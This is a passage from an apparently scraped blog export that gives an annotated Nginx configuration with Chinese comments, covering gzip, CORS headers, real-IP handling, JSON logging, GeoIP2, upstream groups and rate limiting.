預設為 off ## 只有一個新連線進入，如果設定為 on，只有一個 worker 會接受連線，其餘持續休眠 ## 如果設定為 off，所有 worker 會被喚醒，只有一個 worker 會接受連線，其餘重新休眠 ## 業務上使用 TCP 長連線、流量大，off 的效能以及 QPS 表現較佳 accept_mutex off; ## multi_accept on | off; 是否同時接受所有的請求，預設為 off multi_accept on; } ## module: ngx_http_core_module ## 設定 HTTP server 相關 http { ## module: ngx_core_module ## include file | mask; 使用文件中的設定 ## 下方為設定 MIME 類型,類型由 mime.type 文件定義 include mime.types; ## default_type mime-type; 定義默認 MIME 類型，預設為 text/plain default_type application/octet-stream; ## server_names_hash_max_size size; 設定 server_name 的 hash 表最大值，預設為 512 kb server_names_hash_max_size 2048; ## 設定 server_name 的 hash 表的大小，用於快速找到對應的 server_name，預設值取決於 CPU 的 L1 cache server_names_hash_bucket_size 256; ## server_tokens on | off | build | string; 是否在 Nginx 錯誤頁面顯示 Nginx 版本，預設為 on server_tokens off; ## 是否在錯誤日誌記錄 404 log_not_found off; ## 是否啟用 sendfile() 提高文件傳輸效率，預設為 off sendfile on; ## 文件是否使用完整封包發送，預設為 off tcp_nopush on; ## 數據是否儘快傳送，預設為 on tcp_nodelay on; ## 設定長連線持續秒數，超過時間 Nginx 會主動關閉連線，預設為 75 keepalive_timeout 70; ## client_max_body_size size; 設定請求允許最大的 body 大小 client_max_body_size 64M; ## module: ngx_http_gzip_module ## 是否啟用 gzip 壓縮，預設為 off gzip on; ## 設定要壓縮的 Content-Length 最小值，預設為 20 gzip_min_length 1k; ## 設定壓縮緩衝大小，預設為一頁記憶體 ## gzip_buffers number size; gzip_buffers 4 32k; ## 設定壓縮等級，範圍 1 ~ 9，預設為 1 gzip_comp_level 7; ## 設定要壓縮的 MIME 類型，預設為 text/html gzip_types text/plain application/x-javascript text/css application/xml text/javascript application/x-httpd-php application/json; ## 是否在 HTTP response header 增加 Vary: Accept-Encoding，預設為 off gzip_vary on; ## 針對特定 User-Agent 禁用壓縮 ## 下方為設定禁用 IE 6 gzip_disable \u0026#34;MSIE [1-6]\\.\u0026#34;; ## resolver address ... [valid=time] [ipv6=on|off] [status_zone=zone]; 使用指定的 NS 解析 server_name, upstream server 等 resolver 114.114.114.114 8.8.8.8 1.1.1.1; ## module: ngx_http_headers_module ## add_header name value [always]; 在 HTTP response header 增加欄位 ## 下方為設定允許跨域 add_header Access-Control-Allow-Origin *; add_header Access-Control-Allow-Headers DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type; add_header Access-Control-Allow-Methods GET,POST,OPTIONS; add_header Access-Control-Expose-Headers \u0026#39;WWW-Authenticate,Server-Authorization,User-Identity-Token\u0026#39;; ## module: ngx_http_realip_module ## set_real_ip_from address | CIDR | unix:; 設定信任的可被替代的伺服器 IP，如反向代理伺服器 set_real_ip_from 10.0.0.0/8; set_real_ip_from 172.16.0.0/12; set_real_ip_from 192.168.0.0/16; ## real_ip_header field | X-Real-IP | X-Forwarded-For | proxy_protocol; 定義使用哪個標頭取代獲取到的 client IP，預設為 X-Real-IP real_ip_header X-Forwarded-For; ## 將 real_ip_header 設定的標頭中，「最後一個非信任伺服器 IP」或是「最後一個 IP」當成真實 IP，預設為 off real_ip_recursive on; ## module: ngx_http_log_module ## log_format name [escape=default|json|none] string ...; 設定日誌格式 log_format json escape=json \u0026#39;{\u0026#34;@timestamp\u0026#34;:\u0026#34;$time_iso8601\u0026#34;,\u0026#39; \u0026#39;\u0026#34;@source\u0026#34;:\u0026#34;$server_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;ip\u0026#34;:\u0026#34;$http_x_forwarded_for\u0026#34;,\u0026#39; \u0026#39;\u0026#34;client\u0026#34;:\u0026#34;$remote_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;request_method\u0026#34;:\u0026#34;$request_method\u0026#34;,\u0026#39; \u0026#39;\u0026#34;scheme\u0026#34;:\u0026#34;$scheme\u0026#34;,\u0026#39; \u0026#39;\u0026#34;domain\u0026#34;:\u0026#34;$server_name\u0026#34;,\u0026#39; \u0026#39;\u0026#34;client_host\u0026#34;:\u0026#34;$host\u0026#34;,\u0026#39; \u0026#39;\u0026#34;referer\u0026#34;:\u0026#34;$http_referer\u0026#34;,\u0026#39; \u0026#39;\u0026#34;request\u0026#34;:\u0026#34;$request_uri\u0026#34;,\u0026#39; \u0026#39;\u0026#34;args\u0026#34;:\u0026#34;$args\u0026#34;,\u0026#39; \u0026#39;\u0026#34;sent_bytes\u0026#34;:$body_bytes_sent,\u0026#39; \u0026#39;\u0026#34;status\u0026#34;:$status,\u0026#39; \u0026#39;\u0026#34;responsetime\u0026#34;:$request_time,\u0026#39; \u0026#39;\u0026#34;upstreamtime\u0026#34;:\u0026#34;$upstream_response_time\u0026#34;,\u0026#39; \u0026#39;\u0026#34;upstreamaddr\u0026#34;:\u0026#34;$upstream_addr\u0026#34;,\u0026#39; \u0026#39;\u0026#34;http_user_agent\u0026#34;:\u0026#34;$http_user_agent\u0026#34;,\u0026#39; \u0026#39;\u0026#34;Country\u0026#34;:\u0026#34;$geoip2_data_country_name\u0026#34;,\u0026#39; \u0026#39;\u0026#34;State\u0026#34;:\u0026#34;$geoip2_data_state_name\u0026#34;,\u0026#39; \u0026#39;\u0026#34;City\u0026#34;:\u0026#34;$geoip2_data_city_name\u0026#34;,\u0026#39; \u0026#39;\u0026#34;https\u0026#34;:\u0026#34;$https\u0026#34;\u0026#39; \u0026#39;}\u0026#39;; log_format main \u0026#39;$remote_addr - $remote_user [$time_local] \u0026#34;$request\u0026#34; \u0026#39; \u0026#39;$status $body_bytes_sent \u0026#34;$http_referer\u0026#34; \u0026#39; \u0026#39;\u0026#34;$http_user_agent\u0026#34; \u0026#34;$http_x_forwarded_for\u0026#34;\u0026#39;; ## access_log path [format [buffer=size] [gzip[=level]] [flush=time] [if=condition]]; 設定日誌寫入位置以及使用的日誌名稱 ## access_log off; 不紀錄日誌 access_log logs/access.log json; } ","date":"November 19, 2021","hero":"/posts/20211119-nginx/nginx.jpeg","permalink":"https://linzeyan.github.io/posts/20211119-nginx/","summary":"\u003ch1 id=\"record-nginx-configuration-file-and-explanation\"\u003eRecord Nginx configuration file and explanation.\u003c/h1\u003e\n\u003ch2 id=\"files-structure\"\u003efiles structure\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e.\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── geoip.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── nginx.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── sites-available\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e│   ├── default.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── sites-enabled\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e│   ├── default.conf -\u0026gt; ../sites-available/default.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e├── upstream.conf\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"geoipconf\"\u003egeoip.conf\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_geoip2_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## https://github.com/leev/ngx_http_geoip2_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 讀取 GeoIP 資料庫，並進行變數設定\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003egeoip2\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/usr/share/GeoIP/GeoLite2-Country.mmdb\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eauto_reload\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e60m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e$geoip2_metadata_country_build\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emetadata\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ebuild_epoch\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 自定義 $geoip2_data_country_code 值為 $remote_addr 對應的 ISO 3116 規範的國碼\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003e$geoip2_data_country_code\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003esource=\u003c/span\u003e$remote_addr \u003cspan style=\"color:#e6db74\"\u003ecountry\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eiso_code\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 自定義 $geoip2_data_country_name 值為對應的英文城市名\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003e$geoip2_data_country_name\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ecountry\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enames\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003een\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upstreamconf\"\u003eupstream.conf\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_upstream_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 定義 server 組別\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eupstream\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## server address [parameters]; 定義 server\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## parameters:\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## weight=number 定義權重，預設為 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## max_fails=number 設定到 upstream server 的最大重試次數，預設為 1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## fail_timeout=time 設定到達 max_fails 次數之後，暫停向此 upstream server 傳送請求的時間，預設為 10 秒\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## backup 標記此 upstream server 為備用，當其他 upstream server 不可用時，此 upstream server 可接受請求\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## down 標記此 upstream server 為不可用\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e9000\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e9001\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ebackup\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eupstream\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs2\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e9002\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e9003\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ebackup\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eupstream\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs9005\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eserver\u003c/span\u003e 10.7.0.12:\u003cspan style=\"color:#ae81ff\"\u003e9005\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003emax_fails=3\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003efail_timeout=5s\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_map_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## map string $variable { ... } 建立一個新的變數\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003emap\u003c/span\u003e $arg_agent $game_api {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## $arg_agent 請求中 agent 的值(https://abc.com/?agent=123)\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## agent=123, $game_api 的值為 to_nodejs95\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003e123\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs95\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## agent 結尾是 1, 2, 3, 或是 4, $game_api 的值為 to_nodejs1\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003e~*1$\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e~*2$\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e~*3$\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e~*4$\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs1\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 若 agent 不符合上開規則，預設 $game_api 的值為 to_nodejs2\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003edefault\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003eto_nodejs2\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"defaultconf\"\u003edefault.conf\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-nginx\" data-lang=\"nginx\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_limit_req_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 限制請求處理\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## limit_req_zone key zone=name:size rate=rate [sync]; 定義限制請求的規則\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elimit_req_zone\u003c/span\u003e $binary_remote_addr$server_name \u003cspan style=\"color:#e6db74\"\u003ezone=websocket:10m\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003erate=1r/m\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## limit_req_status code; 設定被拒絕連線的 HTTP 狀態碼，預設為 503\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003elimit_req_status\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e502\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## 設定虛擬主機\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003eserver\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## listen port [default_server] [ssl] [http2 | spdy] [proxy_protocol] [setfib=number] [fastopen=number] [backlog=number] [rcvbuf=size] [sndbuf=size] [accept_filter=filter] [deferred] [bind] [ipv6only=on|off] [reuseport] [so_keepalive=on|off|[keepidle]:[keepintvl]:[keepcnt]];\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定監聽的埠口，預設為 *:80\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## 下方設定為監聽 80 port，且為預設的虛擬主機\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elisten\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e80\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003edefault_server\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## server_name name ...; 設定虛擬主機名，可使用正則表示式，預設為 \u0026#34;\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eserver_name\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003e_\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eaccess_log\u003c/span\u003e  \u003cspan style=\"color:#e6db74\"\u003elogs/default/default.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ejson\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003eerror_log\u003c/span\u003e   \u003cspan style=\"color:#e6db74\"\u003elogs/default/default.error.log\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## module: ngx_http_access_module\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#75715e\"\u003e## allow address | CIDR | unix: | all; 允許 IP 訪問\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eallow\u003c/span\u003e 1.1.1.1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## deny address | CIDR | unix: | all; 禁止 IP 訪問\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003edeny\u003c/span\u003e 12.34.56.78;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## 設定請求訪問的根資料夾\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003eroot\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e/usr/share/nginx/html\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## limit_req zone=name [burst=number] [nodelay | delay=number]; 設定限制請求的規則 zone\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_req\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ezone=websocket\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003enodelay\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#75715e\"\u003e## limit_req_log_level info | notice | warn | error; 設定被拒絕連線的請求日誌等級，預設為 error\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e    \u003cspan style=\"color:#f92672\"\u003elimit_req_log_level\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003ewarn\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 